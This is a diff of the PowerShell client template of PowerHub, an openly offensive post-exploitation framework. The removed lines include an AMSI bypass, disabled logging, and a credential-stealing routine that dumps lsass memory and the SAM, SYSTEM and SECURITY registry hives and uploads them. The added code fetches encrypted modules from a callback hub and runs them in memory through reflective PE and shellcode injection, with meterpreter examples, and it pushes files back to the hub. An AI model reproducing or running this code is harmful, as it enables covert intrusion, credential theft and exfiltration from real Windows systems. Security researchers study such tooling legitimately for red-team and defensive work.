@@ -1,14 +1,5 @@
-{#
-Load second amsi-bypass: rasta mouse. It bypasses the process-specific AMSI.
-https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
-#}
-if ($PSVersionTable.PSVersion.Major -ge 5) {
-    {% include "powershell/amsi/rasta-mouse.ps1" %}
-    {% include "powershell/disable-logging.ps1" %}
-}
-
 $FooterLeft = "{{VERSION}}"
-$FooterRight = "written by Adrian Vollmer, 2018-2022"
+$FooterRight = "written by Adrian Vollmer, 2018-2023"
 $SpaceBuffer = " "*(64-2-$FooterLeft.Length-$FooterRight.Length)
 Write-Output @"
   _____   _____  _  _  _ _______  ______ _     _ _     _ ______
@@ -18,14 +9,34 @@ $($FooterLeft, $SpaceBuffer, $FooterRight)
 Run 'Help-PowerHub' for help
 "@
 
-$CALLBACK_URL = ${{symbol_name("CALLBACK_URL")}}
-$KEY = ${{symbol_name("KEY")}}
-$WebClient = ${{symbol_name("WebClient")}}
-
+$KEY = [System.Text.Encoding]::UTF8.GetBytes("{{key}}");
+$CALLBACK_URL = "{{callback_url}}"
+$TransportScheme = "{{transport}}"
 $WEBDAV_URL = "{{webdav_url}}"
-$ErrorActionPreference = "Stop"
+$WEBDAV_USER = "{{webdav_user}}"
+$WEBDAV_PASS = "{{webdav_pass}}"
+{# $WebClient is defined in stage2 #}
+{# The actual code (i.e. the content) of the modules is stored in this separate hashtable #}
+class PowerHubModule { [String]$Name; [String]$Type; [Int]$N; [Bool]$Loaded; [String]$Alias }
+$PowerHubModulesContent = @{ {{preloaded_modules_content}} }
+$PowerHubModules = @( {{preloaded_modules}} )
+
+$CALLBACK_HOST = [regex]::Match($CALLBACK_URL, '(.+/)([^:/]+)((:|/).*)').captures.groups[2].value
 $PS_VERSION = $PSVersionTable.PSVersion.Major
 {{'$DebugPreference = "Continue"'|debug}}
+{% if minimal %}
+{{'Write-Debug "Minimal mode: on"'|debug}}
+{% else %}
+{{'Write-Debug "Minimal mode: off"'|debug}}
+{% endif %}
+
+function prompt {
+    Write-Host ("PowerHub") -nonewline
+    Write-Host ("@") -nonewline -foregroundcolor DarkGreen
+    Write-Host ($CALLBACK_HOST) -nonewline -foregroundcolor DarkYellow
+    Write-Host (" $PWD>") -nonewline
+    return ' '
+}
 
 function Encrypt-AES {
     param(
@@ -69,21 +80,41 @@ function Decrypt-AES {
     $decryptedData
 }
 
+function Encrypt-String {
+    param(
+        [System.String]$string
+  	)
+    $result = [System.Text.Encoding]::UTF8.GetBytes($string)
+    $result = Encrypt-AES $result $KEY
+    $result = [System.Convert]::ToBase64String($result)
+    $result
+}
+
 function Decrypt-String {
     param(
-        [System.String]$string, [Bool]$Code=$False
+        [System.String]$string, [Bool]$AsBytes=$False
   	)
     $result = [System.Convert]::FromBase64String($string)
-    $result = Decrypt-AES $result $KEY
-    if (-not $Code) { $result = [System.Text.Encoding]::UTF8.GetString($result) }
+    {% if slow_encryption %}
+        $result = Decrypt-RC4_ $result $KEY
+    {% else %}
+        $result = Decrypt-AES $result $KEY
+    {% endif %}
+    if (-not $AsBytes) { $result = [System.Text.Encoding]::UTF8.GetString($result) }
     $result
 }
 
 function Transport-String {
     param([String]$1, [hashtable]$2=@{}, [Bool]$3=$False)
-    $args = "?t={{transport}}"
+    $args = "?t=$TransportScheme"
     foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
-    return Decrypt-String ($WebClient.DownloadString("${CALLBACK_URL}${1}${args}")) $3
+    {% if slow_encryption %}
+        $args += '&s=t'
+    {% endif %}
+    $path = "${1}${args}"
+    $path = Encrypt-String $path
+    $path = $path.replace('/', '_').replace('+', '-')
+    return Decrypt-String ($WebClient.DownloadString("${CALLBACK_URL}${path}")) $3
 }
 
 function Unzip-Code {
@@ -104,9 +135,17 @@ function Unzip-Code {
 
 function Update-HubModules {
     Write-Verbose "Updating module list..."
-    $ModuleList = Transport-String "ml"
-    Invoke-Expression "$ModuleList"  | Out-Null
-    $Global:PowerHubModules = $PowerHubModules
+    $ModuleList = Transport-String "list" | ConvertFrom-Csv
+    $Global:PowerHubModules = $ModuleList
+    foreach ($m in $PowerHubModules) {
+        $m.n = [Int]($m.n)
+        $m | Add-Member -TypeName  "PowerHubModule"
+        if ($PowerHubModulesContent.ContainsKey($m.Name)) {
+            $m.Loaded = $True
+        } else {
+            $m.Loaded = $False
+        }
+    }
     $PowerHubModules | Format-Table -AutoSize -Property N,Type,Name,Loaded
 }
 
@@ -114,10 +153,10 @@ function Import-HubModule {
 
     Param(
         [parameter(Mandatory=$true)]
-        $Module
+        $module
     )
 
-    $code = $Module.Code
+    $code = $PowerHubModulesContent.($module.Name)
     $sb = [Scriptblock]::Create($code)
     New-Module -ScriptBlock $sb | Out-Null
 
@@ -146,7 +185,7 @@ function Convert-IntStringToArray ($s) {
 }
 
 function List-HubModules {
-<#
+{% if not minimal %}<#
 .SYNOPSIS
 
 Lists all modules that are available via the hub.
@@ -209,7 +248,7 @@ Transfers the code of modules #1, #4, #5 and #6 from the hub and imports them.
 
 .EXAMPLE
 
-Load-HubModule "-"
+Get-HubModule "-"
 
 Description
 -----------
@@ -219,7 +258,7 @@ Transfers the code of all modules from the hub and imports them.
 
 Use the '-Verbose' option to print detailed information.
 
-#>
+#>{% endif %}
     Param(
         [parameter(Mandatory=$true)] [String] $Expression,
         [parameter(Mandatory=$false)] [Switch] $Reload
@@ -241,26 +280,30 @@ Use the '-Verbose' option to print detailed information.
                 $transport_args = @{"m"=$module.N}
                 # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
                 if ($module.Type -eq 'ps1') {
-                    $module.Code = Transport-String "m" $transport_args
+                    $code = Transport-String "module" $transport_args
+                    $PowerHubModulesContent.($module.Name) = $code
                     Import-HubModule $module
                 } else {
-                    $module.Code = Transport-String "m" $transport_args $True
-                    # Get Basename
-                    if ($Module.Name.Contains('/')) {
-                        $AliasName = $Module.Name.split('/')
-                        $AliasName = $AliasName[$AliasName.Length - 1]
-                    } else {
-                        $AliasName = $Module.Name
-                    }
-                    # Create alias
-                    if ($module.Type -eq 'dotnet') {
-                        New-DotNetAlias $module -Name $AliasName | Out-Null
-                    } elseif ($module.Type -eq 'pe') {
-                        New-ExeAlias $module -Name $AliasName | Out-Null
-                    }
+                    $PowerHubModulesContent.($module.Name) = Transport-String "module" $transport_args $True
                 }
                 $module.Loaded = $True
             }
+
+            # Set Alias in two steps
+            # 1. Get Basename
+            if ($Module.Name.Contains('/')) {
+                $AliasName = $Module.Name.split('/')
+                $AliasName = $AliasName[$AliasName.Length - 1]
+            } else {
+                $AliasName = $Module.Name
+            }
+            # 2. Create alias
+            if ($module.Type -eq 'dotnet') {
+                New-DotNetAlias $module -Name $AliasName | Out-Null
+            } elseif ($module.Type -eq 'pe') {
+                New-ExeAlias $module -Name $AliasName | Out-Null
+            }
+
             $result += $module
         }
     }
@@ -268,6 +311,7 @@ Use the '-Verbose' option to print detailed information.
 }
 
 
+{% if not minimal %}
 function Run-Exe {
 <#
 .SYNOPSIS
@@ -299,7 +343,7 @@ Execute some Hub Module of type 'pe' in memory.
 
 .EXAMPLE
 
-Load-HubModule meterpreter.exe | Run-Exe
+Get-HubModule meterpreter.exe | Run-Exe
 
 Description
 -----------
@@ -317,7 +361,7 @@ Run the binary whose name matches 'procdump64' in memory and dump the lsass proc
 #>
     Param(
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module,
+        [PSTypeName("PowerHubModule")] $Module,
 
         [parameter(Mandatory=$false,Position=1)] [String] $ExeArgs,
 
@@ -335,11 +379,11 @@ Run the binary whose name matches 'procdump64' in memory and dump the lsass proc
         }
     } else {
         if (-not (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)) {
-            Load-HubModule Invoke-ReflectivePEInjection
+            Get-HubModule Invoke-ReflectivePEInjection
         }
         if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue) {
             foreach ($m in $Module) {
-                Invoke-ReflectivePEInjection -PEBytes $m.Code -ForceASLR -ExeArgs $ExeArgs
+                Invoke-ReflectivePEInjection -PEBytes $PowerHubModulesContent.($m.Name) -ForceASLR -ExeArgs $ExeArgs
             }
         } else {
             Write-Error "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
@@ -371,7 +415,7 @@ Save that module whose name matches "SeatBelt" to directory tmp/
 
 .EXAMPLE
 
-Load-HubModule meterpreter.exe | Save-HubModule
+Get-HubModule meterpreter.exe | Save-HubModule
 
 Description
 -----------
@@ -380,17 +424,22 @@ Load the PE module with the name 'meterpreter.exe' in memory and save it to disk
 #>
     Param(
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module,
+        [PSTypeName("PowerHubModule")] $Module,
 
         [parameter(Mandatory=$false,Position=1)] $Directory = ""
     )
 
     foreach ($m in $Module) {
-        $code = $m.Code
+        $code = $PowerHubModulesContent.($m.Name)
+        $BaseName = $m.Name
+        if ($BaseName -match '/') {
+            $BaseName = $BaseName.split('/')
+            $BaseName = $BaseName[$BaseName.Length-1]
+        }
         if ($Directory) {
-            $Filename = "$Directory/$($m.BaseName)"
+            $Filename = "$Directory\$BaseName"
         } else {
-            $Filename = $m.BaseName
+            $Filename = $BaseName
         }
         if ($m.Type -eq "ps1") {
             $code | Set-Content "$Filename" -Encoding UTF8
@@ -401,8 +450,97 @@ Load the PE module with the name 'meterpreter.exe' in memory and save it to disk
     }
 }
 
-function Run-DotNETExe {
+function New-ExeAlias {
 <#
+.SYNOPSIS
+
+Add an alias that acts as a wrapper for 'Get-HubModule|Run-Exe'.
+
+.PARAMETER Module
+
+A PowerHub module object of type "pe".
+
+.PARAMETER Name
+
+Name of the new alias. Default: the module's name.
+
+#>
+    Param(
+        [parameter(Mandatory=$false)] [String] $Name,
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
+        [PSTypeName("PowerHubModule")] $Module
+    )
+    $Function = {
+        $Module | Run-Exe -ExeArgs ([string[]]$args -join " ")
+    }
+    if ($Name) {
+        $FuncName = $Name
+    } else {
+        $FuncName = $Module.Name
+    }
+    $Module.Alias = $FuncName
+    New-Item -Force -Path function: -Name "script:$FuncName" -Value $Function.GetNewClosure()
+}
+
+function Run-Shellcode {
+<#
+.SYNOPSIS
+
+Executes a loaded shellcode module in memory using Invoke-Shellcode, which must be loaded first.
+
+.PARAMETER Module
+
+A PowerHub module object of type "shellcode".
+
+.PARAMETER ProcessID
+
+A process ID of the process to be used for injection.
+
+.EXAMPLE
+
+Run-Shellcode $someModule
+
+Description
+-----------
+Execute a HubModule of type "shellcode" in memory
+
+.EXAMPLE
+
+Get-HubModule meterpreter.bin | Run-Shellcode
+
+Description
+-----------
+
+Load the shellcode module with the name 'meterpreter.bin' in memory and run it
+#>
+    Param(
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
+        [PSTypeName("PowerHubModule")] $Module,
+
+        [ValidateNotNullOrEmpty()] [UInt16] $ProcessID
+    )
+
+    if (-not (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)) {
+        Get-HubModule Invoke-Shellcode
+    }
+    if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
+    {
+        foreach ($m in $Module) {
+            $code = $PowerHubModulesContent.($m.Name)
+            if ($ProcessID) {
+                Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
+            } else {
+                Invoke-Shellcode -Shellcode $code
+            }
+        }
+    } else {
+        Write-Error "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
+    }
+}
+{% endif %}{# end of run-exe block #}
+
+function Run-DotNETExe {
+{% if not minimal %}<#
 .SYNOPSIS
 
 Executes a .NET exe module in memory, which must be loaded first.
@@ -427,7 +565,7 @@ An array of strings that represent the arguments which will be passed to the exe
 
 .EXAMPLE
 
-Load-HubModule SeatBelt | Run-DotNETExe -Arguments "-group=all", "-full", "-outputfile=seatbelt.txt"
+Get-HubModule SeatBelt | Run-DotNETExe -Arguments "-group=all", "-full", "-outputfile=seatbelt.txt"
 
 Description
 -----------
@@ -436,17 +574,17 @@ several parameters
 
 .EXAMPLE
 
-Load-HubModule meterpreter.exe | Run-DotNETExe
+Get-HubModule meterpreter.exe | Run-DotNETExe
 
 Description
 -----------
 
 Load the .NET module with the name 'meterpreter.exe' in memory and run it
-#>
+#>{% endif %}
 
     Param(
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module,
+        [PSTypeName("PowerHubModule")] $Module,
 
         [parameter(Mandatory=$false)] [String] $OutFile,
 
@@ -457,7 +595,7 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
     [Environment]::CurrentDirectory = Get-Location
 
     foreach ($m in $Module) {
-        $code = $m.Code
+        $code = $PowerHubModulesContent.($m.Name)
         $a = [Reflection.Assembly]::Load([byte[]]$code)
         $al = New-Object -TypeName System.Collections.ArrayList
         $al.add($Arguments)
@@ -501,7 +639,7 @@ Name of the new alias. Default: the module's name.
     Param(
         [parameter(Mandatory=$false)] [String] $Name,
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module
+        [PSTypeName("PowerHubModule")] $Module
     )
     $Function = {
         $Module | Run-DotNETExe -Arguments ([string[]]$args)
@@ -515,94 +653,6 @@ Name of the new alias. Default: the module's name.
     New-Item -Force -Path function: -Name "script:$FuncName" -Value $Function.GetNewClosure()
 }
 
-function New-ExeAlias {
-<#
-.SYNOPSIS
-
-Add an alias that acts as a wrapper for 'Get-HubModule|Run-Exe'.
-
-.PARAMETER Module
-
-A PowerHub module object of type "pe".
-
-.PARAMETER Name
-
-Name of the new alias. Default: the module's name.
-
-#>
-    Param(
-        [parameter(Mandatory=$false)] [String] $Name,
-        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module
-    )
-    $Function = {
-        $Module | Run-Exe -ExeArgs ([string[]]$args -join " ")
-    }
-    if ($Name) {
-        $FuncName = $Name
-    } else {
-        $FuncName = $Module.Name
-    }
-    $Module.Alias = $FuncName
-    New-Item -Force -Path function: -Name "script:$FuncName" -Value $Function.GetNewClosure()
-}
-
-function Run-Shellcode {
-<#
-.SYNOPSIS
-
-Executes a loaded shellcode module in memory using Invoke-Shellcode, which must be loaded first.
-
-.PARAMETER Module
-
-A PowerHub module object of type "shellcode".
-
-.PARAMETER ProcessID
-
-A process ID of the process to be used for injection.
-
-.EXAMPLE
-
-Run-Shellcode $someModule
-
-Description
------------
-Execute a HubModule of type "shellcode" in memory
-
-.EXAMPLE
-
-Load-HubModule meterpreter.bin | Run-Shellcode
-
-Description
------------
-
-Load the shellcode module with the name 'meterpreter.bin' in memory and run it
-#>
-    Param(
-        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module,
-
-        [ValidateNotNullOrEmpty()] [UInt16] $ProcessID
-    )
-
-    if (-not (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)) {
-        Load-HubModule Invoke-Shellcode
-    }
-    if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
-    {
-        foreach ($m in $Module) {
-            $code = $m.Code
-            if ($ProcessID) {
-                Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
-            } else {
-                Invoke-Shellcode -Shellcode $code
-            }
-        }
-    } else {
-        Write-Error "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
-    }
-}
-
 
 function Send-Bytes {
     Param(
@@ -610,10 +660,7 @@ function Send-Bytes {
        [Byte[]]$Body,
 
        [Parameter(Mandatory=$False,Position=1)]
-       [String[]]$FileName,
-
-       [Parameter(Mandatory=$False)]
-       [String] $LootId
+       [String[]]$FileName
     )
 
     if ($FileName) {
@@ -629,8 +676,8 @@ function Send-Bytes {
     {{'Write-Debug "Encrypting $Filename..."'|debug}}
     $Body = (Encrypt-AES $Body $KEY)
 
-    if ("{{transport}}" -match "^https?$") {
-        Send-BytesViaHttp -LootId $LootId $Body $FileName
+    if ($TransportScheme -match "^https?$") {
+        Send-BytesViaHttp $Body $FileName
     }
 }
 
@@ -640,10 +687,7 @@ function Send-BytesViaHttp {
        [Byte[]]$Body,
 
        [Parameter(Mandatory=$False,Position=1)]
-       [String[]]$FileName,
-
-       [Parameter(Mandatory=$False)]
-       [String] $LootId
+       [String[]]$FileName
     )
     $boundary = [System.Guid]::NewGuid().ToString()
     $LF = "`r`n"
@@ -658,8 +702,7 @@ function Send-BytesViaHttp {
     $postbody = [System.Text.Encoding]::UTF8.GetBytes($postbody)
 
     $ProgressPreference = 'SilentlyContinue'
-    $post_url = "$(${CALLBACK_URL})u?script"
-    if ($LootId) { $post_url += "&loot=$LootId" }
+    $post_url = "$(${CALLBACK_URL})upload?script"
     {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
     $WebRequest = [System.Net.WebRequest]::Create($post_url)
     $WebRequest.Method = "POST"
@@ -680,7 +723,7 @@ function Send-BytesViaHttp {
 
 
 function PushTo-Hub {
-<#
+{% if not minimal %}<#
 .SYNOPSIS
 
 Uploads files back to the hub via Cmdlet.
@@ -706,16 +749,13 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
 
 Get-ChildItem | PushTo-Hub -Name "directory-listing"
 
-#>
+#>{% endif %}
     Param(
        [Parameter(Mandatory=$False)]
        [String[]]$Files,
 
        [Parameter(Mandatory=$False)]
        [String[]]$Name,
-
-       [Parameter(Mandatory=$false)]
-       [String] $LootId,
 
        [Parameter(Mandatory=$False,ValueFromPipeline=$True)]
        $Stream
@@ -728,6 +768,7 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
         $result = $result + $Stream
     }
     end {
+        if (-not $result -and -not $Files) { return }
         if (-not $Files) {
             {{'Write-Debug "Pushing stdin stream..."'|debug}}
             if ($result.length -ge 1 -and $result[0] -is [System.String]) {
@@ -740,7 +781,7 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
             if (-not $Name) {
                 $Name = "{0}_{1}.dat" -f $Env:COMPUTERNAME, ((Get-Date -Format o) -replace ":", "-")
             }
-            Send-Bytes -LootId $LootId $Body $Name
+            Send-Bytes $Body $Name
         } else {
             ForEach ($file in $Files) {
                 {{'Write-Debug "Pushing $File..."'|debug}}
@@ -752,8 +793,7 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                     $filename = Split-Path $file -leaf
                 }
 
-                Send-Bytes -LootId $LootId $fileBin $filename
-
+                Send-Bytes $fileBin $filename
             }
         }
     }
@@ -763,7 +803,7 @@ $global:WebdavLetter = $Null
 $global:WebdavRoLetter = $Null
 
 function Mount-Webdav {
-<#
+{% if not minimal %}<#
 .SYNOPSIS
 
 Mount the Webdav drive.
@@ -776,21 +816,37 @@ The letter the mounted read-only drive will receive (default: 'R')
 
 The letter the mounted public drive will receive (default: 'S')
 
-#>
+#>{% endif %}
     Param(
         [parameter(Mandatory=$False)]
         [String]$Letter = "S",
         [parameter(Mandatory=$False)]
+        [String]$PrivateLetter = "O",
+        [parameter(Mandatory=$False)]
         [String]$RoLetter = "R"
     )
+
     Set-Variable -Name "WebdavLetter" -Value "$Letter" -Scope Global
     Set-Variable -Name "WebdavRoLetter" -Value "$RoLetter" -Scope Global
-    {{'Write-Debug "Mounting $WEBDAV_URL to $LETTER"'|debug}}
-    $netout = iex "net use ${Letter}: $WEBDAV_URL /persistent:no 2>&1" | Out-Null
-    {{'Write-Debug "Mounting ${WEBDAV_URL}_ro to $RoLETTER"'|debug}}
-    $netout = iex "net use ${RoLetter}: ${WEBDAV_URL}_ro /persistent:no 2>&1" | Out-Null
-    if (!$?) {
-        throw "Error while executing 'net use': $netout"
+    Set-Variable -Name "WebdavPrivateLetter" -Value "$RoLetter" -Scope Global
+
+    $shares = @{
+        $Letter = $WEBDAV_URL
+        $RoLetter = "${WEBDAV_URL}_ro"
+        $PrivateLetter = "${WEBDAV_URL}_private"
+    }
+
+    foreach ($k in $shares.Keys) {
+        $cmd = "net use ${k}: $($shares[$k]) /persistent:no"
+        if ($k -eq  $PrivateLetter) {
+            $cmd += " $WEBDAV_PASS /user:$WEBDAV_USER"
+        }
+        {{'Write-Debug "Mounting: $cmd"'|debug}}
+        $cmd += " 2>&1"
+        $netout = (iex $cmd)
+        if (!$?) {
+            Write-Error "Error while executing 'net use': $netout"
+        }
     }
 }
 
@@ -802,14 +858,12 @@ function Unmount-Webdav {
 Unmount the Webdav drive.
 
 #>
-    If (${WebdavLetter}) {
-        $netout = iex "net use ${WebdavLetter}: /delete 2>&1" | Out-Null
-        $netout = iex "net use ${WebdavRoLetter}: /delete 2>&1" | Out-Null
+    $shares = @($WebdavLetter, $WebdavRoLetter, $WebdavPrivateLetter)
+    foreach ($k in $shares) {
+        $netout = iex "net use ${k}: /delete 2>&1" | Out-Null
         if (!$?) {
-            throw "Error while executing 'net use': $netout"
+            Write-Error "Error while executing 'net use': $netout"
         }
-    } else {
-        throw "No Webdav drive mounted"
     }
 }
 
@@ -854,103 +908,51 @@ Return some basic information about the underlying system
 }
 
 
-function Get-Loot {
-<#
-.SYNOPSIS
-
-Grab credentials from the hard drive and from memory.
-
-Partially based on:
-    PowerSploit Function: Out-Minidump
-    Author: Matthew Graeber (@mattifestation)
-    License: BSD 3-Clause
-#>
-    $LootId = ""
-    1..4 | %{ $LootId += '{0:x}' -f (Get-Random -Max 256) }
-    $SysInfo = Get-SysInfo
-    $SysInfo.IPs = $SysInfo.IPs -Join " "
-    $SysInfo = $SysInfo | ConvertTo-Csv -NoTypeInformation
-
-
-    $SamPath = Join-Path $env:TMP "sam_$($LootId)"
-    $SystemPath = Join-Path $env:TMP "system_$($LootId)"
-    $SecurityPath = Join-Path $env:TMP "security_$($LootId)"
-    $SoftwarePath = Join-Path $env:TMP "software_$($LootId)"
-    $DumpFilePath = $env:TMP
-
-    $Process = Get-Process lsass
-    $ProcessId = $Process.Id
-    $ProcessName = $Process.Name
-    $ProcessHandle = $Process.Handle
-    $ProcessFileName = "$($ProcessName)_$($ProcessId)_$($LootId).dmp"
-    $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
-
-    try {
-        {{'Write-Debug "Dumping sysinfo..."'|debug}}
-        $SysInfo | PushTo-Hub -Name "sysinfo_$($LootId)" -LootId $LootId
-
-        {{'Write-Debug "Dumping lsass to $ProcessDumpPath..."'|debug}}
-        & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $ProcessId $ProcessDumpPath full
-        Wait-Process -Id (Get-Process rundll32).id
-        {{'Write-Debug "Sending lsass dump home..."'|debug}}
-        if (Test-Path $ProcessDumpPath) { PushTo-Hub -LootId $LootId $ProcessDumpPath }
-
-        {{'Write-Debug "Dumping Hives..."'|debug}}
-        & reg save HKLM\SAM $SamPath /y
-        & reg save HKLM\SYSTEM $SystemPath /y
-        & reg save HKLM\SECURITY $SecurityPath /y
-        # & reg save HKLM\SOFTWARE $SoftwarePath /y
-
-        {{'Write-Debug "Sending hive dumps home..."'|debug}}
-        Foreach ($f in $SamPath, $SystemPath, $SecurityPath, $SoftwarePath ) {
-            if (Test-Path $f) { PushTo-Hub -LootId $LootId $f }
-        }
-    } finally {
-        {{'Write-Debug "Deleting dumps..."'|debug}}
-        Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
-            try { Remove-Item -Force $f} catch {}
-        }
-    }
-}
-
-
 function Help-PowerHub {
     Write-Host @"
 The following functions are available (some with short aliases):
   * List-HubModules (lshm)
-  * Load-HubModule (lhm)
   * Get-HubModule (ghm)
   * Update-HubModules (uhm)
   * Get-SysInfo
-  * Get-Loot (glo)
-  * Run-Exe (re)
   * Run-DotNETExe (rdne)
+{%- if not minimal %}
+  * Run-Exe (re)
   * Run-Shellcode (rsh)
+{%- endif %}
   * PushTo-Hub (pth)
   * Mount-Webdav (mwd)
   * Unmount-Webdav (umwd)
 
-Use 'Get-Help' to learn more about those functions.
+{% if not minimal %}Use 'Get-Help' to learn more about those Cmdlets.
+{% else %}Because minimal mode has been activated, comment-based help is not available for those Cmdlets.{% endif %}
 "@
 }
 
-try { New-Alias -Name pth -Value PushTo-Hub } catch { }
-try { New-Alias -Name Load-HubModule -Value Get-HubModule } catch { }
-try { New-Alias -Name lhm -Value Load-HubModule } catch { }
-try { New-Alias -Name ghm -Value Get-HubModule } catch { }
-try { New-Alias -Name lshm -Value List-HubModules } catch { }
-try { New-Alias -Name uhm -Value Update-HubModules } catch { }
-try { New-Alias -Name glo -Value Get-Loot } catch { }
-try { New-Alias -Name re -Value Run-Exe } catch { }
-try { New-Alias -Name rdne -Value Run-DotNETExe } catch { }
-try { New-Alias -Name rsh -Value Run-Shellcode } catch { }
-try { New-Alias -Name mwd -Value Mount-Webdav } catch { }
-try { New-Alias -Name umwd -Value Unmount-Webdav } catch { }
+$Aliases = @{
+    pth = "PushTo-Hub"
+    ghm = "Get-HubModule"
+    lshm = "List-HubModules"
+    uhm = "Update-HubModules"
+    rdne = "Run-DotNETExe"
+    mwd = "Mount-Webdav"
+    umwd = "Unmount-Webdav"
+    {% if not minimal -%}
+    re = "Run-Exe"
+    rsh = "Run-Shellcode"
+    {%- endif %}
+}
+
+foreach ($a in $Aliases.Keys) {
+    try { New-Alias -Force -Name $a -Value $Aliases.$a } catch { }
+}
 
 Update-HubModules | Out-Null
-
-{{ profile }}
-
-if (${{symbol_name("clip_entry")}}) {
-    Invoke-Expression ({{symbol_name("Decrypt-String")}} ${{symbol_name("clip_entry")}})
+foreach ($name in $PowerHubModulesContent.Keys) {
+    foreach ($m in $PowerHubModules) {
+        if ($m.Name -eq $name) {
+            Get-HubModule $m.n | Out-Null
+            break
+        }
+    }
 }
